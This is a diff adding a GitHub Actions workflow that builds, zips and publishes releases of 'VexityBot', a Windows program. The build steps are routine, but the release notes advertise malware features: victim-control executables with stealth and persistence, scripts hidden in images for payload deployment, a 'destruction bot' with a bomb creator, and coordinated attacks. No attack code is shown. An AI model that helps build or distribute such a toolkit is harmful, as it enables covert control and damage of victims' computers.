@@ -1,0 +1,292 @@
+name: Build and Release VexityBot
+
+on:
+  push:
+    tags: [ 'v*' ]
+  workflow_dispatch:
+    inputs:
+      version:
+        description: 'Version to release (e.g., v2.1.0)'
+        required: true
+        default: 'v2.1.0'
+      create_prerelease:
+        description: 'Create as prerelease'
+        required: false
+        default: false
+        type: boolean
+
+jobs:
+  build-and-release:
+    runs-on: windows-latest
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+      with:
+        fetch-depth: 0  # Fetch full history for proper versioning
+    
+    - name: Set up Python 3.9
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.9'
+    
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install -r requirements.txt
+        pip install pyinstaller
+        pip install requests
+    
+    - name: Build VexityBot executable
+      run: |
+        echo "🚀 Building VexityBot executable..."
+        echo "📅 Build started at: $(Get-Date)"
+        
+        # Clean previous builds
+        if (Test-Path "dist") { Remove-Item -Recurse -Force "dist" }
+        if (Test-Path "build") { Remove-Item -Recurse -Force "build" }
+        if (Test-Path "release") { Remove-Item -Recurse -Force "release" }
+        
+        # Build executable
+        python build_auto.bat
+        
+        echo "✅ Build completed successfully!"
+    
+    - name: Verify build
+      run: |
+        echo "🔍 Verifying build..."
+        
+        if (-not (Test-Path "dist\VexityBot.exe")) {
+          echo "❌ VexityBot.exe not found in dist folder!"
+          exit 1
+        }
+        
+        $fileSize = (Get-Item "dist\VexityBot.exe").Length
+        $fileSizeMB = [math]::Round($fileSize/1MB, 2)
+        echo "✅ VexityBot.exe found - Size: $fileSizeMB MB"
+        
+        # Test executable startup
+        echo "🧪 Testing executable startup..."
+        $process = Start-Process -FilePath "dist\VexityBot.exe" -PassThru -WindowStyle Hidden
+        Start-Sleep -Seconds 3
+        
+        if ($process.HasExited) {
+          echo "⚠️ Executable exited immediately, but this might be normal for GUI apps"
+        } else {
+          echo "✅ Executable started successfully"
+          Stop-Process -Id $process.Id -Force
+        }
+    
+    - name: Create release package
+      run: |
+        echo "📦 Creating release package..."
+        
+        # Create release directory
+        New-Item -ItemType Directory -Path "release" -Force | Out-Null
+        
+        # Copy main executable
+        Copy-Item "dist\VexityBot.exe" "release\"
+        
+        # Copy documentation and config files
+        Copy-Item "README.md" "release\"
+        Copy-Item "LICENSE" "release\"
+        Copy-Item "requirements.txt" "release\"
+        Copy-Item "run_vexitybot_gui.bat" "release\"
+        Copy-Item "launcher.bat" "release\"
+        
+        # Copy configuration files
+        if (Test-Path "config") {
+          Copy-Item -Recurse "config" "release\"
+        }
+        
+        # Copy examples
+        if (Test-Path "examples") {
+          Copy-Item -Recurse "examples" "release\"
+        }
+        
+        # Create version file
+        $version = if ($env:GITHUB_REF -match 'refs/tags/v(.+)') { $matches[1] } else { ${{ github.event.inputs.version || 'dev' } -replace '^v', '' }
+        $buildDate = Get-Date -Format "yyyy-MM-dd HH:mm:ss UTC"
+        $commitHash = $env:GITHUB_SHA.Substring(0, 7)
+        
+        @"
+VexityBot Version Information
+============================
+Version: $version
+Build Date: $buildDate
+Commit: $commitHash
+Platform: Windows x64
+Python: 3.9
+PyInstaller: $(pip show pyinstaller | Select-String "Version:" | ForEach-Object { $_.Line.Split(':')[1].Trim() })
+
+Features:
+- 24 Specialized Bots
+- Victim Control EXE
+- Steganography System
+- OmegaBot Ultimate
+- Real-time Monitoring
+- Discord Integration
+- Multi-language Support
+
+System Requirements:
+- Windows 10/11 (64-bit)
+- 4GB RAM minimum, 8GB recommended
+- 100MB free storage space
+
+Installation:
+1. Extract this ZIP file to desired location
+2. Run VexityBot.exe or run_vexitybot_gui.bat
+3. Follow the on-screen instructions
+
+For support and updates, visit:
+https://github.com/${{ github.repository }}
+"@ | Out-File -FilePath "release\VERSION.txt" -Encoding UTF8
+        
+        echo "✅ Release package created successfully"
+        
+        # Display package contents
+        echo "📋 Package contents:"
+        Get-ChildItem -Path "release" -Recurse | ForEach-Object { 
+          $relativePath = $_.FullName.Replace((Get-Location).Path + '\release\', '')
+          echo "  $relativePath"
+        }
+    
+    - name: Create release ZIP
+      run: |
+        $version = if ($env:GITHUB_REF -match 'refs/tags/v(.+)') { $matches[1] } else { ${{ github.event.inputs.version || 'dev' } -replace '^v', '' }
+        $zipName = "VexityBot-v$version.zip"
+        
+        echo "🗜️ Creating ZIP archive: $zipName"
+        Compress-Archive -Path "release\*" -DestinationPath $zipName -Force
+        
+        $zipSize = (Get-Item $zipName).Length
+        $zipSizeMB = [math]::Round($zipSize/1MB, 2)
+        echo "✅ ZIP created: $zipName ($zipSizeMB MB)"
+    
+    - name: Create GitHub Release
+      id: create_release
+      uses: actions/create-release@v1
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      with:
+        tag_name: ${{ github.event.inputs.version || github.ref_name || format('v{0}', github.run_number) }}
+        release_name: VexityBot ${{ github.event.inputs.version || github.ref_name || format('v{0}', github.run_number) }}
+        body: |
+          ## 🤖 VexityBot ${{ github.event.inputs.version || github.ref_name || format('v{0}', github.run_number) }}
+          
+          ### 🚀 What's New
+          - **24 Specialized Bots** - Complete bot management system with individual admin panels
+          - **Victim Control EXE** - Create executables with all 24 bot panels for remote control
+          - **Steganography System** - Hide scripts in images for stealth deployment
+          - **OmegaBot Ultimate** - Advanced destruction bot with bomb creator, EXE builder, and steganography
+          - **Real-time Monitoring** - Live bot status, statistics, and system monitoring
+          - **Discord Integration** - Pokemon-style file monitoring and real-time logging
+          - **Multi-language Support** - Python, Java, C++, and C# implementations
+          
+          ### 📦 Installation
+          1. Download `VexityBot-v${{ github.event.inputs.version || github.ref_name || format('v{0}', github.run_number) }}.zip`
+          2. Extract to your desired location
+          3. Run `VexityBot.exe` or `run_vexitybot_gui.bat`
+          4. Follow the on-screen setup instructions
+          
+          ### ⚠️ System Requirements
+          - **OS**: Windows 10/11 (64-bit)
+          - **RAM**: 4GB minimum, 8GB recommended
+          - **Storage**: 100MB free space
+          - **Network**: Internet connection for VPS features
+          
+          ### 🔧 Build Information
+          - **Build Date**: ${{ github.event.head_commit.timestamp || github.run_started_at }}
+          - **Commit**: ${{ github.sha }}
+          - **Workflow**: ${{ github.workflow }}
+          - **Runner**: ${{ runner.os }}
+          - **Python**: 3.9
+          - **PyInstaller**: Latest
+          
+          ### 📋 Features Overview
+          
+          #### 🤖 Bot Management
+          - 24 specialized bots with unique capabilities
+          - Real-time status monitoring and statistics
+          - Individual admin panels for each bot
+          - Coordinated attack operations
+          - VPS integration and remote management
+          
+          #### 🎯 Victim Control
+          - Create victim control executables
+          - All 24 bot panels in victim EXE
+          - Remote control capabilities
+          - Stealth operation modes
+          - Persistence and auto-start features
+          
+          #### 🖼️ Steganography
+          - Hide scripts in PNG, JPG, BMP images
+          - PowerShell extraction commands
+          - Stealth payload deployment
+          - Multiple image format support
+          
+          #### 💀 OmegaBot Ultimate
+          - Ultimate destruction bot (#24)
+          - Bomb creator with 6 bomb types
+          - EXE builder for standalone files
+          - Steganography integration
+          - Configuration management
+          
+          #### 🌐 Advanced Features
+          - Discord webhook integration
+          - Pokemon-style file monitoring
+          - Real-time screen sharing
+          - Multi-user management
+          - System32 monitoring
+          - File deletion interface
+          
+          ### 🛠️ Development
+          - **Source Code**: Available in repository
+          - **Documentation**: Complete API docs
+          - **Tests**: Comprehensive test suite
+          - **Contributing**: See CONTRIBUTING.md
+          
+          ### 📄 License
+          This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+          
+          ### ⚠️ Disclaimer
+          This software is for educational and research purposes only. Users are responsible for complying with all applicable laws and regulations.
+          
+          ---
+          
+          **⭐ Star this repository if you find it useful!**
+          
+          **🤖 VexityBot - Ultimate Bot Management System**
+        draft: false
+        prerelease: ${{ github.event.inputs.create_prerelease == 'true' || contains(github.ref_name, 'dev') || contains(github.ref_name, 'beta') || contains(github.ref_name, 'alpha') }}
+    
+    - name: Upload Release Asset
+      uses: actions/upload-release-asset@v1
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      with:
+        upload_url: ${{ steps.create_release.outputs.upload_url }}
+        asset_path: ./VexityBot-v${{ github.event.inputs.version || github.ref_name || format('v{0}', github.run_number) }}.zip
+        asset_name: VexityBot-v${{ github.event.inputs.version || github.ref_name || format('v{0}', github.run_number) }}.zip
+        asset_content_type: application/zip
+    
+    - name: Update dist folder
+      run: |
+        echo "📁 Updating dist folder with latest build..."
+        
+        # This step would typically update a separate storage or repository
+        # For now, we'll just log the successful build and release
+        echo "✅ VexityBot executable built and released successfully!"
+        echo "📦 Version: ${{ github.event.inputs.version || github.ref_name || format('v{0}', github.run_number) }}"
+        echo "🔗 Release URL: ${{ steps.create_release.outputs.html_url }}"
+        echo "📊 Executable size: $((Get-Item "dist\VexityBot.exe").Length / 1MB) MB"
+        
+        # Display final status
+        echo ""
+        echo "🎉 Release Summary:"
+        echo "  Version: ${{ github.event.inputs.version || github.ref_name || format('v{0}', github.run_number) }}"
+        echo "  Executable: dist\VexityBot.exe"
+        echo "  Package: VexityBot-v${{ github.event.inputs.version || github.ref_name || format('v{0}', github.run_number) }}.zip"
+        echo "  Release: ${{ steps.create_release.outputs.html_url }}"
+        echo ""
+        echo "🚀 VexityBot is ready for deployment!"
